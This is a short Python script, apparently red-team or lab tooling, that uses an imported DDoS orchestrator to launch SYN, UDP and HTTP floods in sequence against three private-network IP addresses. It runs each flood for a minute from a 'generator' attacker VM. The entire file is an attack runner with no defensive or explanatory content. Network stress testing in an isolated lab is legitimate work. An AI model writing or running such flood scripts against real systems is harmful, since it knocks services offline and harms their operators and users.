import time
import logging
from distributed_ddos_executor import DDoSOrchestrator

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def run_attacks():
    orchestrator = DDoSOrchestrator()

    new_targets = {
        "target_11": "192.168.50.11",
        "target_16": "192.168.50.16",
        "target_81": "192.168.50.81",
    }

    duration = 60  # 1 minute per attack

    for name, ip in new_targets.items():
        logger.info(f"🚀 Starting attacks on {name} ({ip})...")

        # 1. SYN Flood
        logger.info(f"🌊 Launching SYN Flood on {ip}...")
        orchestrator.execute_syn_flood(
            attacker_vm=orchestrator.red_team_vms["generator"],
            target_ip=ip,
            port=80,
            duration=duration,
            background=True
        )

        # 2. UDP Flood
        logger.info(f"🌪️ Launching UDP Flood on {ip}...")
        orchestrator.execute_udp_flood(
            attacker_vm=orchestrator.red_team_vms["generator"],
            target_ip=ip,
            port=53,
            duration=duration,
            background=True
        )

        # 3. HTTP Flood
        logger.info(f"💥 Launching HTTP Flood on {ip}...")
        orchestrator.execute_http_flood(
            attacker_vm=orchestrator.red_team_vms["generator"],
            target_ip=ip,
            port=80,
            duration=duration,
            background=True
        )

        logger.info(f"⏳ Attacks running on {ip} for {duration} seconds...")
        time.sleep(duration + 5)
        logger.info(f"✅ Attacks on {ip} finished")

    logger.info("🏁 All attacks on new targets completed")

if __name__ == "__main__":
    run_attacks()
